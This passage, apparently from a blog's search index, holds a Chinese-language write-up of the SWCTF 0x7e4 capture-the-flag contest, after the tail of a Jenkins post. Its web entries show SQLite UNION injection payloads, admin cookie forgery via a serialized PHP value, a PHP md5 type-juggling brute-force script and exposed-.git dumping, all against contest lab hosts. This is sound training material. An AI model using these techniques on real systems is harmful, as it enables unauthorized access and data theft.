CI/CD，他最後寫出來的 Jenkins 比我的還要複雜XD 但最後我們的評價一致認為下次 CI/CD 的工具應該不會再用 Jenkins，雖說是老牌資源相對多，但也因為長久以來沒有統一的格式造成許多寫法上的混亂，也難怪有些文章的做法是 Jenkins 搭配 ansible 省得麻煩，現在想想還蠻聰明的 XD ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:5:0","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"Syntax Error in Jenkinsfile ? 推薦 VSC Extension Jenkins Pipeline Linter Connector，可以不用 push 到 Github 才從 Jenkins 發現 compiler error，安裝完記得在 VSC settings 設定 Jenkins 的 username / password / url，使用 ctrl/cmd+shift+p 或是預設 shift+alt/option+v 進行檢查。 ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:5:1","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["資訊安全 Cyber Security"],"content":"2021 首篇!! 新年快樂~ 這場 SWCTF 由 逢甲大學黑客社、靜宜大學行雲者研發基地 及 台中科技大學資訊研究社 聯合設計的 CTF 競賽。 雖然還在忙碩論，但想到之後還要打 AIS3-EOF 所以還是加減摸一下，簡單記錄曾經卡住、或是第一次遇到的有趣題目(?)，雖然說 Crypto 真的都偏通靈，實在有點頭痛QQ 感謝 @stavhaygn 和 @MuMu 賽後替我解惑一下沒解開的題目wwwww 官方解 https://hackmd.io/@swctf/writeups 附上人權圖，差不多是 Rank 1 一半的分數，我好爛QQ 有些通靈題和 Flag 大小寫害我正確率爛掉wwwww ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:0:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"NOKIA 3310 (靜宜-Crypto, Score: 200) 你知道如何使用手機傳簡訊嗎? 626352432143742174713223432153619381428142218193638252626391 將數字兩兩一組，分別是 按鍵 \u0026 按幾次。 SWCTF{NOKIAISASPECIALMYTHTHATYOUKNOW} （結果被大小寫雷了一次 WA ==） ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:1:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"A letter (靜宜-crypto, Score: 200) 嘿!你還記得我們第一次見面你告訴我的「不可破譯的密碼」嗎？這次我把關鍵內容放在這首詩裡，或許你能夠解讀出我想告訴你的話。 Released file (pdf) 打開 PDF 就看到一串密文，我人很好直接幫你打在下面 ^_^ Kzwrsomklpp_Evfvtukb_ju_mj_hyvqevjxq_rqe_rdfipwzu_dt_Etzqfuq 題目說到「不可破譯的密碼」，拿去 Google 就會得到 Vigenère cipher ，那有了密文之後… key勒？ 其實整個 PDF 的線索就那幾個，像是把左上角的 CMRDB 拿去當 key 丟到 Cryptii 就會有 Flag 了XD SWCTF{Information_Security_is_as_extensive_and_profound_as_Chinese} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:2:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"MOS (靜宜-crypto, Score: 275) 你工作上的前輩要離職了 前輩在把工作交接給你的時候把有加密的USB和兩串摩斯密碼給你 「這裡面有我們珍藏的片子，去解開它，然後傳承下去!!」 請轉成大寫 第二行為key %u7b為\"{\" %u7d為\"}\" .-.. ...- . --.. -.-- ----.-- .--- .---- .- --- -..- --- --. ----- -.- -.... -.-- .-.. -.-. .--- .--.-. --... -.-- .. -..- .-.. -----.- --.- .-- . .-. - -.-- ..- .. --- .--. .- ... -.. ..-. --. .... .--- -.- .-.. --.. -..- -.-. ...- -... -. -- 題目很好心的跟你說是 Morse code，還給一堆提示，那就找個線上工具還原ㄅ，會得到下面兩串。 LVEZY#J1AOXOG0K6YLCJ@7YIXL# QWERTYUIOPASDFGHJKLZXCVBNM 一開始還以為第二行的 key 是指 Vigenère cipher ，結果不是… 是對應英文字母XD A B C D E F G H I J K L M N O P Q R S T U V W X Y Z ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ Q W E R T Y U I O P A S D F G H J K L Z X C V B N M 保留數字和特殊符號，還原後整理成 Flag 就能送出去了( Flag 居然是無意義的字串) = w = SWCTF{Q1KIUIO0R6FSVQ@7FHUS} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:3:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Base-X (逢甲-Crypto, Score: 200) 聽說駭客聊天時，動不動就要把訊息編碼 wpZTV0NURntCYXNlNjRfdEhlX0xhTkdVNDZlX09mX2g0Q2szcnN9Cg== 不囉唆，Base64。 $ echo \"wpZTV0NURntCYXNlNjRfdEhlX0xhTkdVNDZlX09mX2g0Q2szcnN9Cg==\" | base64 --decode SWCTF{Base64_tHe_LaNGU46e_Of_h4Ck3rs} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:4:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"左右分不清 (逢甲-Crypto, Score: 200) 有個都市傳說： 凌晨 3 點沿著操場跑 1600 公尺會回到起點 ~(\u003e_\u003c。)＼ RVBSE{QNS_5TooNQsr_tOO3q_KNvdQbzRd} Caesar cipher，推薦ㄍ好用的網站 https://planetcalc.com/1434/ SWCTF{ROT_5UppORts_uPP3r_LOweRcaSe} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:5:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"N=pq (逢甲-Crypto, Score: 200) RSA 是世界著名的加密演算法，沒記錯的話用很大的 N 當作加密參數好像就很安全？ 算了反正應該沒人能破解我加密過的 flag : ) N = pq = 16857159784242147958930006036274524315067659003347665436247836447121615960042560515473548747696129683 e = 65537 encrypted_flag = 4133875657690452080396474983972067706781976275589651694439550567678165824984290994659861724649235686 隨意找個 RSA 線上工具即可，當然能自己刻個 code 工具會更好www 解出來會是 (Decimal) 37696146816110213689299726858207805170794163239535976391601058414329946927997 (Hex) 53574354467B695F64306E375F6B6E6F775F686F775F5253415F576F726B737D (ASCII text) SWCTF{i_d0n7_know_how_RSA_Works} 最後解出來的 Decimal 送了很多次 WA，問了學弟才知道還要先轉 Hex 才能轉 ASCII，其實沒有很了解為何需要多這一層 = w = 平常 RSA 的題目不是都直接把 Decimal 外面套 Flag 格式就行了嗎QQ SWCTF{i_d0n7_know_how_RSA_Works} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:6:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Advanced SQL Injection (靜宜-Web, Score: 200) 為了跟上 TIM 哥的腳步，小明持續深入研究 SQL Injection，聽說有種手法是利用 Union 作攻擊 http://swctf.hackersir.org:20000/ 一開始隨意用 admin : admin 弱密碼不小心成功登入，頁面顯示 Hi, admin The flag is in the database. （賽後翻到前端 F12 的 source code 也有給這組帳密XD） 關於 UNION 剛好近期才練習過類似的題目 NSYSU 駭客攻防 HW 0x02 Writeups，套路上差不多。 先用 ' ORDER BY 1 -- 確認到 5 的時候會噴 ERROR，而且資料庫是 SQLite3。 再來就是想辦法用 UNION SELECT 搭配 SQLite Injection 把 Flag 從資料庫中撈出來。 對了，可以注意到登進去的頁面只會顯示第二欄的訊息，也就是下手目標。 // 找版本: 3.27.2 ' UNION SELECT NULL,sqlite_version(),NULL,NULL FROM sqlite_master -- // 找table名稱: flag ' UNION SELECT NULL,tbl_name,NULL,NULL FROM sqlite_master -- // 通靈一下從 表格flag 撈 flag ... Bingo!! ' UNION SELECT NULL,flag,NULL,NULL FROM flag -- 中間省略了很多過程，基本上都是在嘗試各種戳法www SWCTF{c0ngratu1ati0n5_u_find_th3_f1ag} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:7:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🐘 (靜宜-Web, Score: 200) PHP is the best language in the world http://swctf.hackersir.org:20003/ 題目很單純，就是考 PHP 弱型別繞過。 substr(md5(\"CMRDB\" . \"Your Answer\"), 0, 6) == md5(\"s1885207154a\") 結果我被那個 CMRDB 嚇到，想說難道只能硬爆!? 這時 @stavhaygn 剛好路過表示應該有工具吧（結果沒找到），直接把code生出來 == import hashlib import random import string import re while True: answer = \"\".join(random.choices(string.ascii_uppercase + string.digits, k=4)) md5 = hashlib.md5() md5.update(f\"CMRDB{answer}\".encode()) value = md5.hexdigest() match = re.match(r\"0e\\d{4}\", value) if match: print(answer, value) 硬爆不難，反倒是有很多答案可以戳（k=4 的情況下就跑一堆） C1Q5 0e51348aeac13f5a8bb7ba82d82a7395 XFPP 0e42173960df205b0920e0143b01a837 A3VM 0e52395734dd8c5b5107d8439c0e1eb5 1IPQ 0e3719bd0d1dc55c56e72837a84aaaf1 AFVA 0e2255ad3cbfc0cef725bb013f13ecce ... ... k=2 的情況下只有一組解（3D），直接輸入就能拿 Flag 了。 SWCTF{n0w_u_kn0w_wh@t_15_md5} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:8:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Git (靜宜-Web, Score: 200) 小明為了學習網頁安全，正在學習如何撰寫網頁，並且使用工程師必備工具 git 做版本控管。 http://swctf.hackersir.org:20001/ 題目蠻明顯就是 git 了，只是一開始戳 /.git/ 居然是 404（？） 腦洞一下戳 /git/ 就噴 403 Forbidden，直接拿工具 GitHacker 把檔案 Leak 出來。 Note P.S. 賽中官方有修正這個問題，猜測是原本放在 Github 不能同時存在兩個 .git，所以 pull 下來忘了改檔案XD $ git log --oneline 8266d82 (HEAD -\u003e master) add my first website page and delete flag.txt aa54633 add flag.txt 可以發現上一版有新增過 Flag，直接還原即可。 $ git reset --hard HEAD~1 SWCTF{g1t_13ak_15_easy} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:9:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"матрёшка_1 (中科-Misc, Score: 200) There are too many fake files and fake folders, I think the scripting languages can help me solve it. Released file (zip) 載下來的檔案有近 20 MB，偷偷用 zipinfo 可以看到一大堆 Flag 目錄，估計是希望我們從中大海撈針。 Tip P.S. 來路不明的壓縮檔案可能會有 Zip bomb 再來直接下指令就可以拿 Flag 了。 grep -rn '.' -e 'CTF' 不過個人平常找資料都是 -rnw，導致這題莫名卡住。 最後是用 VSCode 大法，內建搜尋XDDDD SWCTF{SH4D0W_CL0N3_JUT5U!!!} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:10:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"матрёшка_2 (中科-Misc, Score: 200) Do you know how to unzip this quickly? Released file (zip) 遞迴解壓縮的裸題，不過說實在自己還是不太會摳 shell script，原本想找時間練一直錯過。 這次是從學弟那邊學 PowerShell 的寫法，如果指令不縮寫給人很專業的感覺(X) 寒假看能不能找時間練這一類的解壓縮題目，不行每次都靠隊友啊QQ while($?){ Expand-Archive *.zip -DestinationPath ./Zip Remove-Item *.zip Move-Item Zip/* ./ } 解到最後會是張含有 base64 的圖片，還要手動還原 == SWCTF{ZIP_FILE_1S_SUCK!!} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:11:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"code (中科-Crypto, Score: 200) 1 and 0 can represent everything原本還沒什麼頭緒，拿遠一點發現是 QR code XD 我用 Python 畫圖，學弟用 MS Word 方塊取代法還原，事後轉念一想，幹這早該有工具了吧 … 嗯也不意外啦 binary-to-qrcode 笑死。 SWCTF{QRRQRRQQQQRRRQRRQR} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:12:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"PNG (靜宜-Misc, Score: 200) 你所在的部隊規定傳達訊息時，必須隱藏在圖片中 而傳送圖片的過程中因不明原因損毀 請嘗試修復並找出訊息 Released file (Unknown) 載下來的檔案用指令 file 看到是純 data，不過題目也提示是 .png 了。 用 hex editor 根據 PNG wikipedia 恢復 Header 的檔案結構吧，修改同時也可以搭配 pngcheck 檢查。 修完會發現圖片可以成功點開 … 但還沒結束 XD 拿去丟圖片題萬用網站 https://aperisolve.fr/ （或是跑指令 zsteg），可以發現是 Flag 是用 LSB 藏起來。 SWCTF{QTQi3NcgqFcB5RJNvyqe} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:13:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Loseless Flowers (逢甲-Misc, Score: 367) 冬天在家賞花其實也不錯，而且照片拍得這麼漂亮 Released file (png) 直接拿去丟圖片題萬用網站 https://aperisolve.fr/ （或是跑指令 exiftool），在 ExifTool 的解析部分可以找到 IFD0 有段網址 https://pastebin.com/AQ4WqdsQ ，以及 XMP-MICROSOFT 藏有對應的密碼 x8U5@3HIZtMlmV@Upteu，結束。 SWCTF{MY_CaMeRa_1s_Bet7er_tH4n_yOur5} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:14:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"CoolMD (逢甲-Web, Score: 200) 作筆記再也不用煩惱太單調了 https://hackmd.io/@swctf/CoolMD/ 第一次遇到用 HackMD 出題，直接 F12 摸一下就有 Flag 了。 SWCTF{coOL_CSsY_Cha7_r0om} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:15:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Evil Robots (逢甲-Web, Score: 200) 機器人什麼都拿，要是連 flag 都被拿走那怎麼辦？ http://swctf.hackersir.org:20200/ 簡單 Web，直接從 robots.txt 找到目錄 /nguinwiuniueniuw/hawuohudsoihfifiofs.php，結束。 SWCTF{d0nt_iNDex_7HE_Fl46} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:16:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Stupid Session (逢甲-Web, Score: 200) 好想當管理員，但只有測試帳號能用 … http://swctf.hackersir.org:20203/ 測試帳密：test : test 用題目給的帳號登入後，可以看到「您收到了來自FBI的一封私訊，請登入管理員 (admin) 帳號查看！」。 所以我們直接從 cookie 下手，這裡推薦 Chrome 套件 EditThisCookie，從網站 cookie 可以看到在 login_info 用 URL decode 後是一串 序列化(serialization) 結構，如下。 a:1:{s:8:\"username\";s:4:\"test\";} 那我們就把 test 改成 admin ㄅ！ a:1:{s:8:\"username\";s:5:\"admin\";} 記得 URL encode 再拿去改 cookie，按下綠色勾勾後 F5 重新整理，拿 Flag 。 SWCTF{C00K1eS_aR3_very_u53FuL} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:17:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Notifications (逢甲-Web, Score: 200) 出題者喜歡吃什麼? 猜對了就給 flag https://swctf.hackersir.org:20202/ 本題請允許網站顯示通知，以獲得完整體驗 一開始就沒打算猜www 果不其然兩個選項都拿不到 Flag ㄏ SWCTF{SeRVICE_woRker_n3w_SubsCRiber} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:18:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Popping Meow (逢甲-Reverse, Score: 200) 喔不，Pop Cat 想找你/妳聊天，結果一不小心擋住 flag 了 :/ Released file (apk) 原本想說難得遇到 apk 逆向題，無聊strings一下 … 欸？ $ strings popping_meow.apk | grep \"CTF\" SWCTF{Ju1cY_Apk_resouRcES} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:19:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Python2Exe (逢甲-Reverse, Score: 239) 曹操心機很重，想取得旗幟必須喊出友軍口號！ Released file (exe) 工具題，用 pyinstxtractor 再從提取出來的檔案直接 grep Flag。 SWCTF{PyThon_Scr1PT_kiddiES} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:20:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"password (中科-Reverse, Score: 200) Find the password if you can! Released file (exe) exe 跑起來會要求輸入密碼，直接用 IDA 拆就會看到 password 了。 BTW，IDA 拆看到輸出的部分是 SWCTF{ %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c }，實在沒看懂怎麼撈 Flag 字串出來的== SWCTF{W33K_P455W0RD_XD} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:21:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"func (中科-Reverse, Score: 275) Jump or not jump? Released file (exe) 用 IDA 拆一拆發現加密規則。 簡單摳一下還原，結束w arr = [0, 3, 17, 29, 8, 60, 114, 60, 116, 13, 125, 17, 32, 52, 120, 122, 41, 11, 34, 58, 59, 33, 49] key = \"STRINGCHARINTFLOATDOUBLE\" flag = \"\".join([ chr((arr[i]) ^ ord(key[i])) for i in range(23) ]) print(flag) SWCTF{1t5_4_tr45h_func} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:22:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"easy reverse (靜宜-Reverse, Score: 200) Released file (exe) 起手式 strings，結束。 $ strings easy_reverse.exe | grep \"CTF\" SWCTF{fm42kb1.gvf} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:23:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Let’s Dance (靜宜-Crypto, Score: 200, Unsolved) 福爾摩斯將訊息進行字母替換並使用某次案件的暗號，將其與助手共享。在此次案件中福爾摩斯的助手在一張紙上留下訊息暗號。 這題應該算是… 不會用 Google 吧== 賽後直接搜尋 “dancing man decode” 就有解了幹XD 另外要注意的是別用 dcode.fr 的表，那個太多細節會很痛苦== 還有，Flag 是全小寫，所以可以無視題目中的旗子（感謝 MuMu 提醒） 事實證明，再簡單的題目還是會有人寫不出來，沒錯 就是我QQ 總之，奇怪的知識增加了.jpg SWCTF{the_murderer_is_the_author} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:24:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Prison life (靜宜-Crypto, Score: 392, Unsolved) 或許學會如何與囚犯溝通也很重要。 Released file (txt) 原本看到一堆點還在猜 Morse code，然後從標題慢慢找去奇怪的方向 Orz 結果原來是 Tap code，以後在監獄也能聊天了(X) 另外也有線上工具可以直接轉 https://cryptii.com/pipes/tap-code SWCTF{yiyuejidingwanshanwuzu} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:25:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"天雨粟 鬼夜哭 (靜宜-Crypto, Score: 488, Unsolved) 小邪手中握著三叔留給他的訊息，看著爺爺書櫃裡的《淮南子》、《說文解字》、《呂氏春秋》、《荀子》、《韓非子》、《大正藏》被擺放的十分整齊，回想著三叔說過的話：「這些書裡紀錄了一位你爺爺的非常尊敬的人，他和文昌帝君有所關聯。這張紙上除了我們現代的編譯還用了因那位人物所衍伸出的智慧，我相信小邪一定可以破解。」 紙條內容： BJ4X06T/65K3DK3QU/6VUP45J/U6FU,4U6C04 Tip 提示1: flag 中的英文字母皆為大寫 只知道用注音的方式拼出來應該是「入雷城者可平心中一切遺憾」，然後… 就沒有然後了 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHkxeTpu6w#天雨粟-鬼夜哭 （哭啊 也太通靈… 還要用倉頡對鍵盤字母 =w= ） ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:26:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Historic Site Tour (靜宜-Crypto, Score: 499, Unsolved) 還記得曾經說過要介紹家鄉的古蹟給你，但一直沒機會，不如就用這次機會讓你自己走一遭吧！我把他們的座標給你，期待你把這些重要的古蹟找出來！（若是英文則皆為小寫） Tip 提示1: flag 是小寫英文串連而成 提示2: flag 中無空白 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHkxeTpu6w#Historic-Site-Tour （有點通靈… 不過想法蠻有趣的XD 但官方都不怕我們座標寫歪找不到地標嗎XD） ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:27:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"GIForever (逢甲-Misc, Score: 200, Unsolved) QR-Code 裡似乎藏著什麼訊息 Released file (gif) 這題我傻眼XDDDD 由於 MacBook 內建的預覽程式會自動把 .gif 每一幀都列出來，賽中打開發現四張 QR 圖，第一個想到的是要去背把圖片疊在一起掃… 結果賽後才知道原來只是把 Flag 拆成四段的QR code，幹!! 背景的うまる可愛歸可愛，還真的有混淆到我QQ 非 MacBook 使用者可以用 stegsolve ，把圖片匯入後從選單按 Analyse \u003e Frame Brower 就可以把每一幀拿出來掃 QR code 了。 SWCTF{UMarU_CRYin6_f0R3vEr_QAQAQ} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:28:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Special RAR (逢甲-Misc, Score: 200, Unsolved) 這個 RAR 其實隱藏著不為人知的秘密 Released file (rar) 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#Special-RAR （太針對軟體 我覺得不行== …不過 7-Zip 可以看到其他檔案真的長知識了） ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:29:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"What Does the Wolf Say (逢甲-Misc, Score: 200, Unsolved) 有玩過 Minecraft 嗎？至少我沒見過這麼酷的狼 (⊙_⊙;) (存檔適用版本 1.16.4；不需開啟遊戲即可解題) Released file (zip) 用 NBT editor 線上工具打開 /playerdata/ 的 .dat 摸一下就有 Flag 惹。 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#What-Does-the-Wolf-Say (細節還沒搞懂QQ) SWCTF{What_kinD_oF_d0g_is_This} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:30:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"耗子尾汁 (逢甲-Misc, Score: 200, Unsolved) Admin：我大意了啊，沒藏好 flag！ Released file (gif) 這題算是大意了QQ 拿去丟 binwalk 就有 Flag 了 =3= $ binwalk -e mabaoguo.gif SWCTF{BzIP_1n_7z_1n_GiF_bu_jiang_wu_de} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:31:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Real Google (逢甲-Misc, Score: 488, Unsolved) 這個網域應該是真的 Google，在上面輸入帳號密碼應該沒問題。可惜似乎連不上 … http://thisisrealgoogle.tw 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#Real-Google （居然是 DNS 的題目，最近才摸過 dig 沒想過是要這樣解QQ） ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:32:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Base-XX (逢甲-Crypto, Score: 467, Unsolved) 這訊息看起來似曾相似，但好像又哪裡怪怪的 … ZIpR1J2NvPqtgSJxbO4xnJ1JTGotDRpxoO4ZnLoJiMqxYAIt5TE++ 我拿 CyberChef 戳半天還是沒想法 Zzzz 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#Base-XX （雖然猜得到是用 base64 的規則改，不過居然有工具誰知道RRR） ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:33:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"babyCPP (逢甲-Reverse, Score: 392, Unsolved) 同學是個 FPS 職業選手，他做了一個訓練反應速度的小遊戲，只有職業選手的眼睛才跟得上！ Released file (exe) 我的 Windows 虛擬機把 libstdc++-6.dll 和 libwinpthread-1.dll 補上還是跑不起來 Orz 打開 IDA 摸一下就會發現疑似藏 Flag 的片段，重點在底下 while 如何產生 Flag。 仔細觀察可以發現從 v3, v4 對應的 v74, v13 位址，然後依次做 XOR，可以寫個簡單的 code 還原。 arr = [185, 229, 202, 12, 82, 20, 19, 218, 44, 51, 70, 155, 87, 145, 40, 142, 109, 28, 59, 200, 21, 226, 203, 16, 161, 3, 85, 46, 185, 215, 65, 18, 128, 250, 122, 19, 120, 197, 121, 184, 214, 101, 184, 126, 40, 63, 189, 76, 206, 58, 250, 1, 122, 111, 187, 127, 75, 20, 64, 171, 162, 196] prefix = arr[:31][::-1] postfix = arr[31:] flag = \"\".join([ chr(i ^ j) for i, j in zip(prefix, postfix) ]) print(flag) SWCTF{dis4ppE4R3d_maGICal_FLaG} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:34:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"C Minor (逢甲-Reverse, Score: 435, Unsolved) 如果想拿到 flag，請先購買專業版授權碼！ Released file (exe) 起手式先 file 查看檔案類型，發現是用 .NET 寫的，用 Windows 執行起來會要求輸入字串進行驗證。 C_Minor.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows 感謝 